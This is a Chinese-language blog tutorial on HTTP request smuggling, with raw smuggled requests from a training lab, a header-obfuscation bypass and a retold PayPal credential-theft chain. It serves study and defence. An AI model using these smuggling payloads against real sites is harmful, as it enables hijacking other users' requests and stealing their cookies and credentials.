<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>HTTP Smuggling攻击 | ph4ntom&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="总结一下自己学习HTTP Smuggling相关的要点及技巧，致敬albinowax">
<meta property="og:type" content="article">
<meta property="og:title" content="HTTP Smuggling攻击">
<meta property="og:url" content="http://yoursite.com/2020/08/24/HTTP-Smuggling/index.html">
<meta property="og:site_name" content="ph4ntom&#39;s blog">
<meta property="og:description" content="总结一下自己学习HTTP Smuggling相关的要点及技巧，致敬albinowax">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/normal-reverse-proxy.jpg">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/smuggling-reverse-proxy.jpg">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/CL_TE.jpg">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/TE_CL.jpg">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/basic_attack.jpg">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/search.jpg">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/search-smuggling.jpg">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/cookie.jpg">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/cookie-smuggling.jpg">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/self-xss.jpg">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/open-redirect.jpg">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/cdn.jpg">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/apache-iis.jpg">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/cache-posion.jpg">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/account.jpg">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/paypal-smuggling.jpg">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/paypal-csp.jpg">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/paypal-iframe.jpg">
<meta property="og:image" content="http://yoursite.com/image/HTTP-Smuggling/paypal-success.jpg">
<meta property="article:published_time" content="2020-08-24T07:34:57.000Z">
<meta property="article:modified_time" content="2020-11-25T10:30:42.486Z">
<meta property="article:author" content="ph4ntom">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://yoursite.com/image/HTTP-Smuggling/normal-reverse-proxy.jpg">
  
    <link rel="alternate" href="/atom.xml" title="ph4ntom&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">ph4ntom&#39;s blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-HTTP-Smuggling" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/08/24/HTTP-Smuggling/" class="article-date">
  <time datetime="2020-08-24T07:34:57.000Z" itemprop="datePublished">2020-08-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      HTTP Smuggling攻击
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>实际上HTTP Smuggling已经不是一个很新的攻击技术，早在2005年，就已经有人提出过这一攻击方式，只是这一攻击方式普遍被认为过于复杂以及难以利用于实战，故而在被提出后并没有受到太多的重视</p>
<p>然而，往往人们不看好的东西会有着巨大的财富</p>
<p>借用albinowax的原话:</p>
<p><strong>If a technique has a reputation for being difficult, fiddly, or dangerous, that’s a topic in dire need of further research. After repeatedly experiencing breakthroughs due to being pressured into exploring topics well outside my comfort zone, I’ve decided that the fastest route to novel findings is actively seeking out topics that make you uncomfortable. Chances are, these topics are avoided by other hackers, giving them serious research potential. To me, this is the only plausible explanation for why I was able to take a technique first documented in 2005, and presented again at DEF CON in 2016, and use it to earn $70k in bounties in 2019.</strong></p>
<p>所以，好好研究，没有不好用的攻击技术，只有你不会玩的～</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>HTTP偷渡(HTTP Smuggling)的原理可以简单用下面两张图来解释:</p>
<p>首先是正常环境下的，用户访问一个带有反代服务器的网站:</p>
<p><img src="/image/HTTP-Smuggling/normal-reverse-proxy.jpg" alt="normal"></p>
<p>可以看到，由于HTTP / 1.1的兴起，反向代理服务器往往会将多个用户的请求通过单个的tcp链接串联在一起发送至后端服务器，实际上这一方法本身是无害的，只要前后端对于每一个消息的开始、结束位置达成一致，那么这一技术会大大减轻前后端服务器的负载，加快数据传输的效率。</p>
<p>但是，这也成为了一个薄弱的环节，因为这就意味着前后端必须对每个消息的结束位置达成一致，如果无法达成一致，那么就有可能发生如下图的情况:</p>
<p><img src="/image/HTTP-Smuggling/smuggling-reverse-proxy.jpg" alt="smuggling"></p>
<p>也就是说攻击者可以构造畸形模糊的请求，使得后端服务器在处理攻击者的请求时只处理了“部分”恶意请求，而把“剩余”的恶意请求以及正常的用户请求视作同一个请求并进行处理，从而劫持用户的请求。</p>
<p>这种攻击手法，就被称为HTTP偷渡(HTTP Smuggling)技术</p>
<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>首先，现在的核心问题在于，我们应该如何构造一个所谓的<strong>畸形模糊的请求</strong>？</p>
<p>这里就要引入一个我们大家都很熟知的概念—Transfer-Encoding</p>
<p>相信大多数人知道这个概念都是因为我们可以利用Transfer-Encoding绕过waf，但是，实际上这一技术带来了许多神奇的攻击面，包括今天讨论的主角HTTP Smuggling</p>
<p>我们大家都知道，一个HTTP POST请求当中往往会有一个Content-Length头，这个头标示了此POST请求所携带的数据的长度，而如果我们在一个HTTP请求当中同时添加两个Content-Length头，并且使用不同的值，绝大多数的服务器会直接拒绝这种格式的请求，认为此格式是非法的</p>
<p>但是，参考RFC 2616规范，如果同时存在Content-Length以及Transfer-Encoding头，文档规定Content-Length头需要被忽略。故而我们可以得知一点：如果一个post请求当中同时携带Content-Length以及Transfer-Encoding头，那么这个请求是合法的，绝大多数的服务器并不会拒绝这样的请求</p>
<p>那么问题就来了，如果两台服务器对这样的请求，一台服务器不支持Transfer-Encoding，另一台支持，那么，整个系统就不同步了，攻击者可以籍此触发HTTP Smuggling漏洞</p>
<p>以下两张图可以帮助理解此问题:</p>
<ul>
<li>首先我假设前端服务器并不支持Transfer-Encoding，而后端服务器支持，在HTTP Smuggling中，我们往往将这一情况称为CL.​​TE</li>
</ul>
<p><img src="/image/HTTP-Smuggling/CL_TE.jpg" alt="CL.​​TE"></p>
<p>在图中，我们可以看到，由于前端服务器不支持Transfer-Encoding，故而前端服务器只会转发蓝色的文本至后端服务器，而后端服务器由于一直无法收到以0结尾的Transfer-Encoding消息结束块，故而会一直等待，此链接就会超时。</p>
<ul>
<li>而如果前端服务器支持Transfer-Encoding，后端服务器不支持，那么在HTTP Smuggling中，这类情况被称为TE.CL</li>
</ul>
<p><img src="/image/HTTP-Smuggling/TE_CL.jpg" alt="TE.CL"></p>
<p>在图中，可以看到由于前端服务器支持Transfer-Encoding，故而前端只会转发蓝色字体部分至后端服务器，而此时由于后端服务器需要读取6个字节长度的数据，需要等待最后一个X的到来，故而此时链接就会超时</p>
<p>这两种方式都可以用来检测潜在的HTTP Smuggling风险</p>
<p>那么也许有人会说，这不过就是让自己的链接超时罢了，没有什么大用，如果是这么想的话，看看下图如何？</p>
<p><img src="/image/HTTP-Smuggling/basic_attack.jpg" alt="Attack"></p>
<p>从图中可以看到，这是一个CL.​​TE类型的HTTP Smuggling攻击，前端服务器转发了包括蓝色及橙色消息在内的所有消息，而后端服务器在解析的过程中，只解析了蓝色字体部分，这就使得橙色消息被留在了缓冲区中，并与后来的一个受害者请求(绿色字体)合并，称为了一个新的HTTP请求</p>
<p>也就是说，原本受害者希望向/search路径POST一个请求，但是由于HTTP Smuggling的存在，后端服务器在用户完全不知情的情况下，误认为受害者向/404发出了一个get请求，从而引发了受害者无法访问/search路径的问题。</p>
<p>而这里的路径是完全可以自定义的，攻击者完全可以利用HTTP Smuggling漏洞迫使受害者加载恶意的外部js或者结合缓存漏洞形成拒绝服务攻击</p>
<h2 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h2><p>上面我简单介绍了一些HTTP Smuggling的基础攻击手段及方式，接下来，我将更深入探讨HTTP Smuggling的更多用法</p>
<h3 id="窃取“秘密的”HTTP标头"><a href="#窃取“秘密的”HTTP标头" class="headerlink" title="窃取“秘密的”HTTP标头"></a>窃取“秘密的”HTTP标头</h3><p>相信大家都知道，很多反向代理服务器会在代理HTTP请求至后端服务器的同时，附加一些HTTP头，比如我们所熟知的X-Real-IP等等</p>
<p>这些标头里往往包含有一些比较敏感的信息，因为有些网站会将认证相关的信息附在HTTP头中</p>
<p>HTTP Smuggling攻击将帮助我们获取这些敏感信息</p>
<p>首先，我们需要一个存在漏洞的网站(在此例中是CL-TE)并找到一个能够反射出我们输入的参数的端点，比如我们常用的搜索框：</p>
<p><img src="/image/HTTP-Smuggling/search.jpg" alt="search"></p>
<p>可以看到，我搜索了“hello”后，上方的提示栏会将我们搜索的内容反射出来</p>
<p>既然如此，我就可以构造如下的请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 125</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https:&#x2F;&#x2F;ac701fe11e21cc0a80c70e6500f4004c.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.125 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: xxx</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,ru;q&#x3D;0.8</span><br><span class="line">Cookie: session&#x3D;nMmCAchGAacq8iL9F1dNu70NqtFYpCfd</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search&#x3D;hello</span><br></pre></td></tr></table></figure>
<p>由于CL-TE型漏洞的存在，故而前端将会转发所有的请求字符，但是，后端服务器在解析时，却仅解析了终止符，故而以下的字符被留在了缓冲区中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search&#x3D;hello</span><br></pre></td></tr></table></figure>

<p>当我将第一个请求再次发送时，在后端服务器看来，将会变成这个样子:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search&#x3D;helloPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Unknown-header:xxxxxxxxx</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 125</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https:&#x2F;&#x2F;ac701fe11e21cc0a80c70e6500f4004c.web-security-academy.net</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.125 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: xxx</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,ru;q&#x3D;0.8</span><br><span class="line">Cookie: session&#x3D;nMmCAchGAacq8iL9F1dNu70NqtFYpCfd</span><br><span class="line">Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure>

<p>最终可以看见这样的返回:</p>
<p><img src="/image/HTTP-Smuggling/search-smuggling.jpg" alt="search-smuggling"></p>
<p>可以看到，后端服务器误把第二个POST请求当作了HTTP头，返回并暴露了敏感的头信息</p>
<p>基于此信息，就有机会可以进一步利用内网的api等敏感基础设施</p>
<h3 id="窃取身份验证信息"><a href="#窃取身份验证信息" class="headerlink" title="窃取身份验证信息"></a>窃取身份验证信息</h3><p>这个和上一个很像，基于同样的原理，我们可以窃取并保存用户的身份验证信息</p>
<p>发送如下的请求：</p>
<p><img src="/image/HTTP-Smuggling/cookie.jpg" alt="cookie"></p>
<p>在此例中，服务器存在TE-CL漏洞，前端服务器将蓝色及橙色字体完整地转发给了后端服务器，而由于后端服务器不支持TE头，故而只能解析蓝色字体部分，橙色字体的部分便被留在了缓冲区中，等待受害者请求(绿色字体)到来时，橙色字体部分将和上一个例子一样，与绿色字体部分相结合，构成一个完整的HTTP请求，从而使得受害者本身的GET请求变为了一个更新个人信息的请求(这里的个人信息是攻击者的个人信息)</p>
<p>攻击成功后如下:</p>
<p><img src="/image/HTTP-Smuggling/cookie-smuggling.jpg" alt="cookie-smuggling"></p>
<p>可以看见，受害者的HTTP头信息被保存在了攻击者的bio中，只需要调节橙色部分的CL长度，就可以将受害者的所有HTTP头全部窃取</p>
<h3 id="Self-XSS"><a href="#Self-XSS" class="headerlink" title="Self-XSS"></a>Self-XSS</h3><p>相信大家在挖洞的过程中一定遇到过不少的self-xss，这类xss很难被利用，所以往往我们在遇到这类漏洞的时候，会选择直接忽略</p>
<p>然而，若网站存在HTTP Smuggling漏洞，那么，Self-XSS也将成为威力巨大的武器</p>
<p>如果一个网站存在HTTP Smuggling漏洞，且其SAML参数容易收到XSS攻击的影响，那么，发送如下的请求：</p>
<p><img src="/image/HTTP-Smuggling/self-xss.jpg" alt="self-xss"></p>
<p>解析过程如前两例所示，此时黑色字体将是受害者所获得的HTTP响应，已然被植入了XSS Payload</p>
<p>借助HTTP Smuggling，Self-XSS也将成为不可忽视的漏洞点</p>
<h3 id="Open-Redirecting"><a href="#Open-Redirecting" class="headerlink" title="Open-Redirecting"></a>Open-Redirecting</h3><p>同样的，由于我们可以实现Self-XSS，那么，在遇到一些基于DOM的开放重定向时，HTTP Smuggling也能发挥一波</p>
<p>例如在redhat.com上有一个页面有如下的代码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;assets&#x2F;idx?redir&#x3D;&#x2F;&#x2F;redhat.com@evil.net&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: www.redhat.com</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">var destination &#x3D; getQueryParam(&#39;redir&#39;)</span><br><span class="line">[poor filtering]</span><br><span class="line">document.location &#x3D; destination</span><br></pre></td></tr></table></figure>

<p>js尝试读取get请求中的redir的值并将网页重定向至其所指向的页面</p>
<p>此时发送如下的请求：</p>
<p><img src="/image/HTTP-Smuggling/open-redirect.jpg" alt="open-redirect"></p>
<p>我们就可以劫持任意用户跳转至我们所希望的网页。</p>
<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>许多网站会使用CDN技术，并且CDN的提供商也往往提供基于HOST标头，从一个网站访问同一CDN网络上的另一个网站的服务</p>
<p>那么，我们可以对存在漏洞的网站发送如下的请求:</p>
<p><img src="/image/HTTP-Smuggling/cdn.jpg" alt="cdn"></p>
<p>这样我们就可以将原本访问redacted.com的受害者引导至<a target="_blank" rel="noopener" href="http://www.redhat.com网站">www.redhat.com网站</a></p>
<p>更进一步说，我们完全可以使用户加载一个错误且非预期的资源</p>
<p>SaaS提供商同样适用这一特性</p>
<h3 id="“帮凶”-Apache和IIS"><a href="#“帮凶”-Apache和IIS" class="headerlink" title="“帮凶” Apache和IIS"></a>“帮凶” Apache和IIS</h3><p>相信大家应该都有注意到基于Apache以及IIS所搭建的网站都有一个这样的特性，就是当你访问一个不以反斜杠结尾的文件夹时，Apache和IIS都将会以HOST标头为基础重定向响应，以此来向文件夹末尾追加斜杠</p>
<p>比如说这样一个请求:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;test HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br></pre></td></tr></table></figure>

<p>在发往由Apache以及IIS搭建的网站时，会收到如下的回复</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Location: https:&#x2F;&#x2F;example.com&#x2F;test&#x2F; </span><br></pre></td></tr></table></figure>

<p>基于这个看来无害的特性，同时利用HTTP-Smuggling，我们可以使用如下的方式进行攻击:</p>
<p><img src="/image/HTTP-Smuggling/apache-iis.jpg" alt="apache-iis"></p>
<p>如图就可以将受害者的请求导向我们所指定的网站，另外，如果目标网站回复的是307的状态码，则可以更进一步，窃取用户POST的敏感数据</p>
<p>因为307会使得POST请求重新发送至新的目标,但是需要用户的确认，RFC原文为: If the 307 status code is received in response to a request other than GET or HEAD, the user agent MUST NOT automatically redirect the request unless it can be confirmed by the user, since this might change the conditions under which the request was issued</p>
<h3 id="缓存毒化"><a href="#缓存毒化" class="headerlink" title="缓存毒化"></a>缓存毒化</h3><p>缓存毒化是一个很有趣的话题，我会在之后的blog中详细讨论这个技术，现在，来瞅瞅这一技术如何与HTTP-Smuggling配合，实现惊人的效果</p>
<p>例如我们向目标网站发出如下请求:</p>
<p><img src="/image/HTTP-Smuggling/cache-posion.jpg" alt="cache-posion"></p>
<p>受害者本身是访问/static/site.js的，然而却被我们劫持并访问了自己的账户信息，并且此时这个请求是携带受害者本身的cookie的</p>
<p>如果此网站存在缓存漏洞，那么在后端服务器返回账户信息的同时，缓存会错误的认为，/static/site.js的响应是受害者/account/settings所返回的信息并将其缓存</p>
<p>此时，作为攻击者，我们只需要访问/static/site.js这个静态文件，就可以获得受害者的账户信息:</p>
<p><img src="/image/HTTP-Smuggling/account.jpg" alt="account"></p>
<h2 id="攻击实例"><a href="#攻击实例" class="headerlink" title="攻击实例"></a>攻击实例</h2><p>接下来的攻击实例是基于albinowax大神对于paypal的攻击</p>
<h3 id="发现请求走私漏洞"><a href="#发现请求走私漏洞" class="headerlink" title="发现请求走私漏洞"></a>发现请求走私漏洞</h3><p>首先攻击者发现了paypal登录页面上存在请求走私的漏洞，基于此，攻击者可以劫持几乎所有的paypal登陆界面所引用的js文件，如下:</p>
<p><img src="/image/HTTP-Smuggling/paypal-smuggling.jpg" alt="paypal-smuggling"></p>
<p>由于paypal使用了CDN，基于我之前介绍的基于CDN的攻击，攻击者可以籍此劫持受害者的js文件至外部网站的恶意js文件</p>
<p>注意，这里location重定向指向了http网站，而paypal网站是https的，故而无法引入http资源，但是在Safari和IE上有特例,Safari拥有HSTS机制，如果这个转向的网站已经在safari的HSTS缓存中，那么http将自动升级为https；而IE则是可以完全绕过这一限制，在https中引入http资源</p>
<p>所以本次攻击只对Safari和IE用户生效！</p>
<h3 id="解决CSP"><a href="#解决CSP" class="headerlink" title="解决CSP"></a>解决CSP</h3><p>但是，由于paypal使用了CSP策略，故而劫持失败了</p>
<p><img src="/image/HTTP-Smuggling/paypal-csp.jpg" alt="paypal-csp"></p>
<p>攻击者继续寻找，发现了登陆界面有一个iframe加载了一个c.paypal.com上的子页面，并且此子页面没有使用CSP，同时导入了我们投毒的js文件，这时候攻击者就获得了iframe的完全控制权</p>
<p><img src="/image/HTTP-Smuggling/paypal-iframe.jpg" alt="paypal-iframe"></p>
<h3 id="解决同源策略"><a href="#解决同源策略" class="headerlink" title="解决同源策略"></a>解决同源策略</h3><p>但是，此时由于c.paypal.com与paypal.com不同源，同源策略限制了对paypal.com的DOM树的访问</p>
<p>故而，攻击者进一步查找，终于在paypal.com/us/gifts上找到了一个不使用CSP，且导入了投毒后的js文件的网页，而因为攻击者已经完全控制了iframe，故而攻击者可以将此iframe重定向至paypal.com/us/gifts并第三次触发投毒后的js文件导入，从而籍被污染的js文件来操作paypal.com/signin的界面，获取明文的用户名密码。</p>
<p><img src="/image/HTTP-Smuggling/paypal-success.jpg" alt="paypal-success"></p>
<h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>paypal修复了这个漏洞，通过将akamai配置为拒绝<code>Transfer-Encoding: chunked</code>来修复此问题</p>
<p>但是albinowax随后发现，如果将TE头修改成下面这种形式，将可以绕过paypal的缓解措施:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding:</span><br><span class="line">chunked</span><br></pre></td></tr></table></figure>

<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>通过学习albinowax大神的文章以及相关的知识，又掌握了一个小小的黑科技hh，其实没有什么没用的漏洞，完全是看利用者的水平，菜刀在高手的手里，也会变成精巧无比的手术刀。</p>
<p>另外，立个flag，速速把缓存毒化的blog也搞出来hh</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/08/24/HTTP-Smuggling/" data-id="ckhx9966y001par5y8a3x8bjm" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2020/08/25/Web-Cache-Poisoning/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          WEB缓存投毒攻击技术
        
      </div>
    </a>
  
  
    <a href="/2020/08/24/Socks5-UDP/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Socks5中UDP Associate特性实现与trick</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA/">赏金猎人</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/binary/" rel="tag">binary</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bug-bounty/" rel="tag">bug bounty</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/code/" rel="tag">code</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pentest/" rel="tag">pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/binary/" style="font-size: 16.67px;">binary</a> <a href="/tags/bug-bounty/" style="font-size: 10px;">bug bounty</a> <a href="/tags/code/" style="font-size: 16.67px;">code</a> <a href="/tags/pentest/" style="font-size: 20px;">pentest</a> <a href="/tags/web/" style="font-size: 13.33px;">web</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/11/13/ret2dl/">ret2dl</a>
          </li>
        
          <li>
            <a href="/2020/11/11/bypass-Canary/">bypass Canary</a>
          </li>
        
          <li>
